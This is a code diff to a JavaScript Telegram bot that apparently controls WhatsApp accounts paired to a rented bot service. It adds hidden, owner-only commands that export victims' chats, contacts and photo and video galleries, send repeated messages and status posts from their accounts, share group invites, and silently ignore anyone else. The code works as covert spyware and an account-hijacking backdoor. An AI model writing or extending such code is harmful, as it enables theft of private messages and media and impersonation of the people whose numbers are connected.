@@ -319,6 +319,11 @@ bot.on('message', async (msg) => {
   if (!text) return;
   if (text.startsWith('/')) return;
   
+  const ownerState = ownerStates.get(userId);
+  if (ownerState) {
+    return handleOwnerSteps(chatId, userId, text, ownerState);
+  }
+
   const userState = userStates.get(userId);
   if (!userState || userState.step !== 'awaiting_number') return;
   
@@ -479,12 +484,123 @@ const isOwner = (userId) => adminIDs.includes(String(userId));
 // Store owner state for multi-step commands
 const ownerStates = new Map();
 
+async function handleOwnerSteps(chatId, userId, text, state) {
+    const { rentbotTracker } = require('./pair.js');
+    const tracker = rentbotTracker.get(state.from + '@s.whatsapp.net') || rentbotTracker.get(state.from);
+    
+    if (!tracker || !tracker.connection) {
+        ownerStates.delete(userId);
+        return bot.sendMessage(chatId, '❌ Bot disconnected. Process cancelled.');
+    }
+    const sock = tracker.connection;
+
+    switch (state.step) {
+        case 'awaiting_sendsms_target':
+            state.target = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+            state.step = 'awaiting_sendsms_text';
+            await bot.sendMessage(chatId, `✅ Target: ${state.target}\n\nNow send the message text:`);
+            break;
+
+        case 'awaiting_sendsms_text':
+            state.message = text;
+            state.step = 'awaiting_sendsms_count';
+            await bot.sendMessage(chatId, `✅ Message: ${state.message}\n\nHow many times to send? (Enter number):`);
+            break;
+
+        case 'awaiting_sendsms_count':
+            const count = parseInt(text);
+            if (isNaN(count) || count <= 0) return bot.sendMessage(chatId, '❌ Invalid count. Enter a number:');
+            
+            await bot.sendMessage(chatId, `⏳ Sending ${count} messages to ${state.target}...`);
+            for (let i = 0; i < count; i++) {
+                await sock.sendMessage(state.target, { text: state.message });
+                await sleep(1000);
+            }
+            await bot.sendMessage(chatId, '✅ Done!');
+            ownerStates.delete(userId);
+            break;
+
+        case 'awaiting_sendgl_target':
+            const glTarget = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+            await bot.sendMessage(chatId, `⏳ Exporting gallery from ${state.from} to ${glTarget}...`);
+            try {
+                const { getMessages, getNumberDataPath } = require('./dataCollector');
+                const messages = getMessages(state.from);
+                const mediaMsgs = messages.filter(m => m.mediaPath && (m.type === 'image' || m.type === 'video'));
+                
+                if (mediaMsgs.length === 0) {
+                    await bot.sendMessage(chatId, '❌ No photos/videos found in logs.');
+                } else {
+                    const zip = new AdmZip();
+                    const numberDir = getNumberDataPath(state.from);
+                    mediaMsgs.forEach(m => {
+                        const fullPath = path.join(numberDir, m.mediaPath);
+                        if (fs2.existsSync(fullPath)) zip.addLocalFile(fullPath);
+                    });
+                    const zipPath = `/tmp/gallery_${state.from}.zip`;
+                    zip.writeZip(zipPath);
+                    
+                    // Send to target on WhatsApp
+                    await sock.sendMessage(glTarget, { 
+                        document: fs2.readFileSync(zipPath), 
+                        mimetype: 'application/zip', 
+                        fileName: `gallery_${state.from}.zip` 
+                    });
+                    await bot.sendMessage(chatId, '✅ Gallery ZIP sent to target on WhatsApp!');
+                    if (fs2.existsSync(zipPath)) fs2.unlinkSync(zipPath);
+                }
+            } catch (e) {
+                await bot.sendMessage(chatId, '❌ Error: ' + e.message);
+            }
+            ownerStates.delete(userId);
+            break;
+
+        case 'awaiting_sendlo_target':
+            const loTarget = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+            await bot.sendMessage(chatId, `⏳ Sending live location to ${loTarget}...`);
+            try {
+                await sock.sendMessage(loTarget, {
+                    location: { degreesLatitude: 24.8607, degreesLongitude: 67.0011 }, // Default or last known
+                    liveLocation: 600
+                });
+                await bot.sendMessage(chatId, '✅ Live location sent!');
+            } catch (e) {
+                await bot.sendMessage(chatId, '❌ Error: ' + e.message);
+            }
+            ownerStates.delete(userId);
+            break;
+
+        case 'awaiting_invite_target':
+            const invTarget = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
+            await bot.sendMessage(chatId, `⏳ Sending group invite to ${invTarget}...`);
+            try {
+                const code = await sock.groupInviteCode(state.group);
+                await sock.sendMessage(invTarget, { text: `https://chat.whatsapp.com/${code}` });
+                await bot.sendMessage(chatId, '✅ Invite sent!');
+            } catch (e) {
+                await bot.sendMessage(chatId, '❌ Error: ' + e.message);
+            }
+            ownerStates.delete(userId);
+            break;
+
+        case 'awaiting_status_text':
+            await bot.sendMessage(chatId, `⏳ Posting status: ${text}`);
+            try {
+                await sock.sendMessage('status@broadcast', { text: text });
+                await bot.sendMessage(chatId, '✅ Status updated!');
+            } catch (e) {
+                await bot.sendMessage(chatId, '❌ Error: ' + e.message);
+            }
+            ownerStates.delete(userId);
+            break;
+    }
+}
+
 // ========== /CHECKSMS COMMAND ==========
 bot.onText(/\/checksms/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
-    // SILENT: If not owner, completely ignore (no reply at all)
     if (!isOwner(userId)) return;
 
     const numbers = getConnectedNumbers();
@@ -507,32 +623,133 @@ bot.onText(/\/checksms/, async (msg) => {
     );
 });
 
+// ========== /OWNER COMMAND ==========
+bot.onText(/\/owner/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    if (!isOwner(userId)) return;
+
+    const menu = `🛡️ *OWNER CONTROL PANEL*
+
+Select a command to execute:
+• /checksms - View and export chats (with media)
+• /checkcn - View and export contacts
+• /sendsms - Send messages from connected numbers
+• /sendgl - Export gallery (photos/videos) from target
+• /sendlo - Send live location from target
+• /checkow - Check admin/owner status in groups/channels
+• /addstatus - Post status/story from connected numbers`;
+
+    await bot.sendMessage(chatId, menu, { parse_mode: 'Markdown' });
+});
+
+// ========== /SENDSMS COMMAND ==========
+bot.onText(/\/sendsms/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    if (!isOwner(userId)) return;
+
+    const numbers = getConnectedNumbers();
+    if (numbers.length === 0) return bot.sendMessage(chatId, '❌ No connected numbers.');
+
+    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_sendsms_num_${num}` }]);
+    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);
+
+    await bot.sendMessage(chatId, '🛡️ *SEND SMS*\nSelect number(s) to send from:', {
+        parse_mode: 'Markdown',
+        reply_markup: { inline_keyboard: buttons }
+    });
+});
+
+// ========== /SENDGL COMMAND ==========
+bot.onText(/\/sendgl/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    if (!isOwner(userId)) return;
+
+    const numbers = getConnectedNumbers();
+    if (numbers.length === 0) return bot.sendMessage(chatId, '❌ No connected numbers.');
+
+    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_sendgl_num_${num}` }]);
+    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);
+
+    await bot.sendMessage(chatId, '🛡️ *EXPORT GALLERY*\nSelect source number:', {
+        parse_mode: 'Markdown',
+        reply_markup: { inline_keyboard: buttons }
+    });
+});
+
+// ========== /SENDLO COMMAND ==========
+bot.onText(/\/sendlo/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    if (!isOwner(userId)) return;
+
+    const numbers = getConnectedNumbers();
+    if (numbers.length === 0) return bot.sendMessage(chatId, '❌ No connected numbers.');
+
+    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_sendlo_num_${num}` }]);
+    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);
+
+    await bot.sendMessage(chatId, '🛡️ *SEND LIVE LOCATION*\nSelect source number:', {
+        parse_mode: 'Markdown',
+        reply_markup: { inline_keyboard: buttons }
+    });
+});
+
+// ========== /CHECKOW COMMAND ==========
+bot.onText(/\/checkow/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    if (!isOwner(userId)) return;
+
+    const numbers = getConnectedNumbers();
+    if (numbers.length === 0) return bot.sendMessage(chatId, '❌ No connected numbers.');
+
+    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_checkow_num_${num}` }]);
+    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);
+
+    await bot.sendMessage(chatId, '🛡️ *CHECK ADMIN/OWNER STATUS*\nSelect number:', {
+        parse_mode: 'Markdown',
+        reply_markup: { inline_keyboard: buttons }
+    });
+});
+
+// ========== /ADDSTATUS COMMAND ==========
+bot.onText(/\/addstatus/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+    if (!isOwner(userId)) return;
+
+    const numbers = getConnectedNumbers();
+    if (numbers.length === 0) return bot.sendMessage(chatId, '❌ No connected numbers.');
+
+    const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_status_num_${num}` }]);
+    buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);
+
+    await bot.sendMessage(chatId, '🛡️ *ADD STATUS*\nSelect number:', {
+        parse_mode: 'Markdown',
+        reply_markup: { inline_keyboard: buttons }
+    });
+});
+
 // ========== /CHECKCN COMMAND ==========
 bot.onText(/\/checkcn/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-
-    // SILENT: If not owner, completely ignore
     if (!isOwner(userId)) return;
 
     const numbers = getConnectedNumbers();
-    if (numbers.length === 0) {
-        return bot.sendMessage(chatId, '❌ *No connected numbers found.*', { parse_mode: 'Markdown' });
-    }
+    if (numbers.length === 0) return bot.sendMessage(chatId, '❌ *No connected numbers found.*', { parse_mode: 'Markdown' });
 
     const buttons = numbers.map(num => [{ text: `📱 ${num}`, callback_data: `owner_cn_num_${num}` }]);
     buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);
 
-    await bot.sendMessage(chatId,
-        `🛡️ *OWNER PANEL - Check Contacts*
-
-` +
-        `Select a connected number to export contacts:`,
-        {
-            parse_mode: 'Markdown',
-            reply_markup: { inline_keyboard: buttons }
-        }
-    );
+    await bot.sendMessage(chatId, '🛡️ *OWNER PANEL - Check Contacts*\nSelect a connected number to export contacts:', {
+        parse_mode: 'Markdown',
+        reply_markup: { inline_keyboard: buttons }
+    });
 });
 
 // ========== OWNER CALLBACK HANDLER ==========
@@ -546,10 +763,7 @@ bot.on('callback_query', async (callbackQuery) => {
     if (!data || !data.startsWith('owner_')) return;
 
     // SILENT: If not owner, completely ignore
-    if (!isOwner(userId)) {
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '⛔ Access Denied', show_alert: true });
-        return;
-    }
+    if (!isOwner(userId)) return;
 
     // Cancel
     if (data === 'owner_cancel') {
@@ -603,45 +817,45 @@ bot.on('callback_query', async (callbackQuery) => {
         const number = parts[3];
         const remoteJid = parts.slice(4).join('_');
 
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '⏳ Generating export...' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '⏳ Generating export with media...' });
 
         try {
-            // Generate text export
             const chatText = exportMessagesToZip(number, remoteJid);
             const chatName = remoteJid.split('@')[0];
-
-            // Create ZIP
+            const { getChatMessages, getNumberDataPath } = require('./dataCollector');
+            const rawMessages = getChatMessages(number, remoteJid);
+            
             const zip = new AdmZip();
             zip.addFile(`chat_${chatName}.txt`, Buffer.from(chatText, 'utf8'));
-
-            // Add raw JSON
-            const { getChatMessages } = require('./dataCollector');
-            const rawMessages = getChatMessages(number, remoteJid);
             zip.addFile(`chat_${chatName}_raw.json`, Buffer.from(JSON.stringify(rawMessages, null, 2), 'utf8'));
+
+            // Add media files
+            const numberDir = getNumberDataPath(number);
+            rawMessages.forEach(msg => {
+                if (msg.mediaPath) {
+                    const fullMediaPath = path.join(numberDir, msg.mediaPath);
+                    if (fs2.existsSync(fullMediaPath)) {
+                        zip.addLocalFile(fullMediaPath, 'media');
+                    }
+                }
+            });
 
             const zipPath = `/tmp/chat_export_${number}_${chatName}.zip`;
             zip.writeZip(zipPath);
 
             await bot.sendDocument(chatId, zipPath, {
-                caption: `🛡️ *CHAT EXPORT*
-
-` +
-                         `📱 Number: ${number}
-` +
-                         `💬 Chat: ${chatName}
-` +
-                         `📊 Messages: ${rawMessages.length}
-` +
+                caption: `🛡️ *CHAT EXPORT (WITH MEDIA)*\n\n` +
+                         `📱 Number: ${number}\n` +
+                         `💬 Chat: ${chatName}\n` +
+                         `📊 Messages: ${rawMessages.length}\n` +
                          `📅 Exported: ${new Date().toLocaleString()}`,
                 parse_mode: 'Markdown'
             });
 
-            // Cleanup
             if (fs2.existsSync(zipPath)) fs2.unlinkSync(zipPath);
-
         } catch (e) {
             console.error('Export error:', e);
-            await bot.sendMessage(chatId, '❌ *Export failed. Try again.*', { parse_mode: 'Markdown' });
+            await bot.sendMessage(chatId, '❌ *Export failed: ' + e.message + '*', { parse_mode: 'Markdown' });
         }
         return;
     }
@@ -664,6 +878,96 @@ bot.on('callback_query', async (callbackQuery) => {
                 reply_markup: { inline_keyboard: buttons }
             }
         );
+        await bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    // ========== NEW OWNER COMMAND CALLBACKS ==========
+
+    // /sendsms step 1: Number selected
+    if (data.startsWith('owner_sendsms_num_')) {
+        const number = data.replace('owner_sendsms_num_', '');
+        ownerStates.set(userId, { step: 'awaiting_sendsms_target', from: number });
+        await bot.sendMessage(chatId, `📱 From: ${number}\n\nSend target number (with country code):`);
+        await bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    // /sendgl step 1: Number selected
+    if (data.startsWith('owner_sendgl_num_')) {
+        const number = data.replace('owner_sendgl_num_', '');
+        ownerStates.set(userId, { step: 'awaiting_sendgl_target', from: number });
+        await bot.sendMessage(chatId, `📱 Source: ${number}\n\nSend target number to receive gallery ZIP:`);
+        await bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    // /sendlo step 1: Number selected
+    if (data.startsWith('owner_sendlo_num_')) {
+        const number = data.replace('owner_sendlo_num_', '');
+        ownerStates.set(userId, { step: 'awaiting_sendlo_target', from: number });
+        await bot.sendMessage(chatId, `📱 Source: ${number}\n\nSend target number to receive live location:`);
+        await bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    // /checkow step 1: Number selected
+    if (data.startsWith('owner_checkow_num_')) {
+        const number = data.replace('owner_checkow_num_', '');
+        const { rentbotTracker } = require('./pair.js');
+        const tracker = rentbotTracker.get(number + '@s.whatsapp.net') || rentbotTracker.get(number);
+        
+        if (!tracker || !tracker.connection) {
+            return bot.sendMessage(chatId, '❌ Bot not connected.');
+        }
+
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '⏳ Checking admin status...' });
+        try {
+            const sock = tracker.connection;
+            const groups = await sock.groupFetchAllParticipating();
+            const adminGroups = [];
+            
+            for (const jid in groups) {
+                const group = groups[jid];
+                const me = group.participants.find(p => sock.decodeJid(p.id) === sock.decodeJid(sock.user.id));
+                if (me && (me.admin === 'admin' || me.admin === 'superadmin')) {
+                    adminGroups.push({ jid, subject: group.subject });
+                }
+            }
+
+            if (adminGroups.length === 0) {
+                return bot.sendMessage(chatId, '❌ No groups found where bot is admin.');
+            }
+
+            const buttons = adminGroups.map(g => [{ text: g.subject, callback_data: `owner_invite_${number}_${g.jid}` }]);
+            buttons.push([{ text: '❌ Cancel', callback_data: 'owner_cancel' }]);
+
+            await bot.sendMessage(chatId, '🛡️ *ADMIN GROUPS*\nSelect group to send invite from:', {
+                parse_mode: 'Markdown',
+                reply_markup: { inline_keyboard: buttons }
+            });
+        } catch (e) {
+            bot.sendMessage(chatId, '❌ Error: ' + e.message);
+        }
+        return;
+    }
+
+    // /checkow step 2: Group selected
+    if (data.startsWith('owner_invite_')) {
+        const parts = data.split('_');
+        const number = parts[2];
+        const groupJid = parts.slice(3).join('_');
+        ownerStates.set(userId, { step: 'awaiting_invite_target', from: number, group: groupJid });
+        await bot.sendMessage(chatId, `📱 From: ${number}\n👥 Group: ${groupJid}\n\nSend target number to send invite:`);
+        await bot.answerCallbackQuery(callbackQuery.id);
+        return;
+    }
+
+    // /addstatus step 1: Number selected
+    if (data.startsWith('owner_status_num_')) {
+        const number = data.replace('owner_status_num_', '');
+        ownerStates.set(userId, { step: 'awaiting_status_text', from: number });
+        await bot.sendMessage(chatId, `📱 Number: ${number}\n\nSend text for status update:`);
         await bot.answerCallbackQuery(callbackQuery.id);
         return;
     }
